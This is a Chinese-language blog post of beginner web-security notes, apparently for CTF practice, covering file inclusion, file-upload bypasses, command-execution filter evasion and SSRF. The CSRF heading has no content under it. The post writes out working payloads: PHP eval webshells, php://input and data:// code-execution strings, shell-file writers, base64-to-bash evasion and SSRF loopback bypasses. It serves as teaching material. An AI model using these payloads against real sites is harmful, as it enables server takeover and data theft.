---
title: Web基础漏洞
date: 2021-09-28 15:48:49
updated: 2023-04-03 15:48:49
tags: [Web知识点]
categories: Web安全
toc: true
top: 1
---

初学web时的基础漏洞知识：文件包含、文件上传、RCE、SSRF、CSRF
<!-- more -->
## 信息泄露

常见的信息泄露：[ CTFHUBWeb技能树——信息泄露](https://blog.csdn.net/a597934448/article/details/105431367)

robots.txt	.git	.phps	.svn	www.zip	vim缓存泄露(.index.php.swp)	

kindeditor的文件空间	php测试探针（tz.php)	backup.sql

## 一、文件包含漏洞

- 一、常见函数漏洞点

  - include()、include_once()、require()、require_once()

  - 应用场景：

    - 具有相关文件包含函数

    - 存在动态变量 `inlcude $file`

    - 攻击者能够控制该变量 例如：`$file=$_GET['file']`

    - file page等参数

- 二、本地文件和远程文件包含漏洞    （[相关链接](https://www.cnblogs.com/appear001/p/11149996.html)）

  - 本地文件

    - 当被包含的文件在服务器本地时，就形成的本地文件包含漏洞

    - 常见敏感信息路径![](https://api2.mubu.com/v3/document_image/5393a52f-b373-4e3e-8ab6-f7ffe4d1ed64-10191865.jpg)

  - 远程文件
    - 服务器的php.ini的配置选项`allow_url_fopen`和`allow_url_include`为On，则include/require函数式可加载远程文件

- 三、文件包含技巧之php伪协议包含

  - 类型

    - file:// 访问本地文件系统

    - http:// 访问 HTTPs 网址

    - ftp:// 访问 ftp URL

    - php:// 访问输入输出流

    - phar:// php归档

    - zlib:// 压缩流

    - data:// 数据

    - ssh2:// security shell2

    - expect:// 处理交互式的流

    - glob:// 查找匹配的文件路径

  - 常用

    - <font color='red'>php://input</font>

      它是个可以访问请求的原始数据的只读流，即获取post传过去的数据

      - 利用条件：allow_url_include = on , fopen不做要求
        - 利用方式：`include.php?file=php://input`,之后再传POST数据

      - POST：

        ```php
        <?php 代码 ?>
        
        <?php print_r(scandir(".")) ; ?>  打印当前目录所有文件
        
        <?php fputs(fopen('shell.php','w'),'<?php @eval($_POST["cmd"]); ?>');?>  写入一句话木马文件
        
        <?php echo readfile('../../../flag'); ?> 读取并显示文件
        
        <?php system('find / -name flag*'); ?> 调用系统命令
        ```

    - <font color='red'>data:URI schema</font> （可以绕过php字符）

      - 利用条件：php>=5.2,allow_url_include/fopen=on
      - 利用方式:`file=data:text/plain, 代码`
      - `file=data:text/plain;base64,<?php system('cat flag.php');`
    
    - <font color='red'>php://filter</font>
    
      一般用它来读取源码，不过要先经过base64加密，得到结果后再解密
    
      - 利用方式:`=php://filter/read=convert.base64-encode/resource=文件名`
      - **常用来查看不被php解析显示的信息**
      - `php://filter/write=convert.base64-decode/resource=`
      - 可以将base64的字符串解码后写入resource的文件里
    
    - <font color='red'>phar://</font>
    
      解析压缩包内的文件
    
      - 利用条件：php>=5.3.0
    
      - phar://shell.zip/shell.txt

- 四、通过session文件包含getshell

  - session简介

    - cookie存在客户端，保存账号密码，session存在服务端，跟踪会话

    - 一般对于登录点存在注册用户的，可以起一个为payload的名字，payload就会保存在session中

  - 利用条件：

    - 1、文件路径已知  可以通过phpinfo页面获取,session_save_path，或者猜测/var/lib/php/sess_PHPSESSID 或 /tmp/sess_PHPSESSID

    - 2、其中部分内容可控

## 二、文件上传漏洞&基本绕过

**一句话木马的两种形式，当<?php被过滤时，可以用第二种**

```php+HTML
<?php @eval($_POST["cmd"]);?>
<script language="php">@eval($_POST["cmd"]);</script>
```

- 一、文件上传漏洞绕过方式

  - <font color='red'>1、客户端验证</font>
    js脚本检验上传文件的后缀名，白名单/黑名单形式，只在前端验证
  - <font color='red'>2、服务端mime类型绕过</font>
  - 服务端通过`Content-Type`的值来判断文件类型
    
  - 抓包后修改为 ，例如： image/jpeg  image/png等
  - <font color='red'>3、00截断绕过</font>
    - 条件：php版本在5.3之前 && php参数设置里magic_quetos_gpc是关闭的
    - `%00` 将会截断后面的内容，代表字符串到此结束（注意get和filename都要修改）
  - <font color='red'>4、文件头检验</font>
    - （1） .JPEG;.JPE;.JPG，”JPGGraphic File”
    - （2） .gif，”GIF 89A” 
    - （3） .zip，”Zip Compressed”
    - （4） .doc;.xls;.xlt;.ppt;.apr，”MS Compound Document v1 or Lotus Approach APRfile”

- 二、黑名单检测绕过

  - <font color='red'>1、黑名单过滤不全</font>

    - 修改后缀名例如：
      - php3 php4 php5 phtml
      - jsp jspx jspf
      - asp asa cer aspx
    - 大小写过滤不全：PHP

  - <font color='red'>2、上传.htaccess文件绕过</font>

    该文件时Apache服务器中的一个配置文件，负责相关目录下的网页配置

    - 新建一个.htaccess文件内容为：SetHandler application/x-httpd-php

    - 再上传jpg文件，并打开即可解析

  - <font color='red'>3、空格和. 绕过</font>

    - 在文件后面加上 空格或者点号

    - 在文件后面加上 `. .`（点 空格 点）

  - <font color='red'>4、::\$DATA绕过</font>     在文件后面加上::$DATA
    基于Windows的NTFS文件流特性

  - <font color='red'>5、双写绕过</font>——后缀名改为`pphphp`

  - <font color='red'>6、上传 .user.ini添加后门</font> [.user.ini文件构成的PHP后门](https://wooyun.js.org/drops/user.ini文件构成的PHP后门.html)

    - 只要是以fastcgi运行的php都可以用这个方法

    - ![](https://i.loli.net/2021/10/31/XLqch7GYfPtFJ1O.png)

    - `auto_prepend_file`指定一个文件，自动包含在要执行的文件前，类似于在文件前调用了require()函数。而`auto_append_file`类似，只是在文件后面包含。 使用方法很简单，直接写在.user.ini中：

      ```bash
      auto_append_file=shell.jpg
      ```

      我们可以借助.user.ini轻松让所有php文件都“自动”包含某个文件

- 三、图片木马利用

  - 使用条件

    - 1、需要结合文件包含漏洞
      - 目标网站存在该php漏洞，例如include.php，即可用/include.php?file=图片地址来实现webshell![](https://api2.mubu.com/v3/document_image/2ceabea5-b6a4-46b6-b791-c39396a7cde8-10191865.jpg)

    - 2、配合解析漏洞利用

  - 制作图片木马 命令行方式：copy 1.jpg/b+shell.php/a muma.jpg

  - 图片二次渲染绕过

    - JPG二次渲染绕过

      - 先将图片上传后再下载下来保存在本地例如123.jpg

      - 把该123.jpg和jpg_payload.php放入带有php环境的文件夹中

      - cmd执行：php jpg_payload.php 123.jpg 生成新的木马图片

      - 上传后利用文件包含漏洞实现webshell

    - GIF二次渲染绕过

      - 上传后再下载到本地

      - 用010Editor进行前后对比，找出没有二次渲染的部分

      - 在没有渲染的部分加入代码，并再次上传

- 四、几种解析漏洞

  - IIS5.X/6.0解析漏洞

    - 目录解析：/xx.asp/xx.jpg
      - 在网站下建立文件夹名称为.asp .asa的文件夹，目录内的任何文件都会被当作asp文件来解析并执行

    - 文件解析：shell.asp;.jpg
      - 在IIS6.0下分号后面的不被解析，IIS6.0默认的可执行文件除了asp还包括：shell.asa/.cer/.cdx(黑检绕过)

  - IIS 7.0/7.5/ Ngnix<8.03畸形解析漏洞

    - 在默认Fast_CGI开启下，上传一个名为shell.jpg的文件，内容为：
    - `<?php fputs(fopen('shell.php','w'),'<?php eval($_POST['cmd'])?>');?>`
    - 然后访问shell.jpg/.php，就会生成shell.php文件
  
  - Ngnix空字节代码执行漏洞

    - 版本：0.5、0.6、0.7<=0.7.65 、0.8<=0.8.37

    - 在图片中嵌入php代码后访问：`xxx.jpg%00.php`来执行代码

## 三、RCE

- 常见操作命令

  - 常见命令执行函数
    - system()
    - passthru()
    - exec()
    - shell_exec()
    - `反引号
    - ob_start()

  - 1.查看文件

    - **<font color='red'>linux查看文件命令</font>**![](https://api2.mubu.com/v3/document_image/9d92c7b7-692a-4245-bb71-e28aae82ea48-10191865.jpg)

    - <font color='red'>windows：type flag.txt</font>

  - 2.查找文件

    - [linux查找文件](https://blog.csdn.net/xxmonstor/article/details/80507769)

    - find命令![img](https://api2.mubu.com/v3/document_image/894f7bfb-df81-4091-bd7b-ef0076719340-10191865.jpg)

  - 3.写入文件

    - \>是覆写，>>是追加
  - `echo "<?php @eval($_POST["cmd"]);?>">shell.php`

  ## 绕过技巧

  - <font color='red'>1.管道符</font>

    - linux![](https://api2.mubu.com/v3/document_image/b2056527-0ac9-41ea-a4c7-5686aa631e44-10191865.jpg)

    - windows![](https://api2.mubu.com/v3/document_image/4cb6c028-a1a3-4564-b692-4d2c65ddcc7a-10191865.jpg)

  - <font color='red'>2.空格</font>

    - <  重定向符 or > <>

    - \$IFS$9

    - %20

    - %09(需要php环境)

  - <font color='red'>3.前后缀</font>

    - %0a 换行符(php环境)

    - %00 截断

    - %20%23

  - **<font color='red'>4.黑名单绕过</font>**

    - 1.拼接：a=c;b=at;c=fl;d=ag;$a$b $c$d

    - 2.base64编码

      - echo "Y2F0IGZsYWc="|base64 -d (该编码为cat)

      - echo "Y2F0IGZsYWc="|base64 -d|bash (在bash被过滤的情况下可尝试sh)

    - 3.单双引号：c""at fl''ag

    - 4.反斜线：c\at fl\ag

    - 5.正则![](https://api2.mubu.com/v3/document_image/8f8ca449-d18f-497b-b5da-e05dba2b1b5e-10191865.jpg)

  - <font color='red'>5.其他技巧</font>

    - 1.内联执行---就是将``或$()内命令的输出作为输入执行

      - cat\$IFS$9\`ls`

      - cat\$IFS$9$(ls)

    - 2.文件构造绕过

      利用ls -t和>以及换行符绕过长度限制执行命令(文件构造绕过)

      - ![](https://api2.mubu.com/v3/document_image/e587b377-1752-445d-9285-bea15b567c22-10191865.jpg)


## 四、SSRF(服务端请求构造)

- SSRF（服务端请求伪造）

  一种构造请求，由服务端发起请求的安全漏洞

  - 漏洞原理

    - 服务端提供了从其他服务器获取数据的功能，但没有对内网目标地址做过滤和限制

    - 主要方式：

    - 1.对外网、服务器所在内网、本地进行端口扫描，获取Banner信息

    - 2.测试运行在内网或本地的应用程序

    - 3.利用file协议读取本地文件等

  - 漏洞代码分析
    - ![](https://api2.mubu.com/v3/document_image/5206f57b-6a7a-434d-8e8c-dad04e71cfc1-10191865.jpg)

  - 漏洞利用

    - [伪协议利用](https://www.cnblogs.com/-mo-/p/11673190.html)

      - file://  -- 本地文件传输协议，主要用于访问本地计算机中的文件

      - gopher:// -- 互联网上使用的分布型的文件搜集获取网络协议，出现在http协议之前

      - dict://   -- 字典服务器协议，dict是基于查询相应的TCP协议，服务器监听端口2628

      - sftp://   -- SSH文件传输协议（SSH File Transfer Protocol），或安全文件传输协议（Secure File Transfer Protocol）

      - ldap://   -- 轻量级目录访问协议。它是IP网络上的一种用于管理和访问分布式目录信息服务的应用程序协议

      - tftp://   -- 基于lockstep机制的文件传输协议，允许客户端从远程主机获取文件或将文件上传至远程主机

    - PHP函数

      - file_get_contents()

      - fsockopen()

      - curl_exec()

  - <font color='red'>gopher协议详解</font>---[链接](https://zhuanlan.zhihu.com/p/112055947)

    - gopher协议支持发出GET、POST请求：可以先截获get请求包和post请求包，在构成符合gopher协议的请求。gopher协议是ssrf利用中最强大的协议

    - gopher协议格式：URL:`gopher://<host>:<port>/<gopher-path>_后接TCP数据流`

    - gopher的默认端口是70

    - 如果发起post请求，回车换行需要使用`%0d%0a`，如果多个参数，参数之间的`&`也需要进行URL编码

    - 发送HTTP请求![](https://api2.mubu.com/v3/document_image/0ce1c2f7-5c82-45ee-bd84-14f0b7b569bb-10191865.jpg)

    - 注意事项![](https://api2.mubu.com/v3/document_image/c39e8c8e-4ab9-4599-bf6b-de760df958cf-10191865.jpg)

  - IP绕过方式---[链接](https://zhuanlan.zhihu.com/p/73736127)

    - `locahost绕过`：攻击本地地址，过滤掉127.0.0.1的情况下，用locahost替代

    - `利用@`：http://example.com@127.0.0.1 实际访问的是后面ip

    - `进制转换绕过`，例如：127.0.0.1可以转换为：
      - 十六进制 = 0x7F000001
      - 十进制 = 2130706433
      - 十进制转换 八进制转换 十六进制转换  不同进制组合转换

    - `利用句号`：127。0。0。1  >>>  127.0.0.1

    - `利用302跳转`
      - http://xip.io 当我们访问这个网站的子域名的时候，例如192.168.0.1.xip.io，就会自动重定向到192.168.0.1。

## 五、CSRF
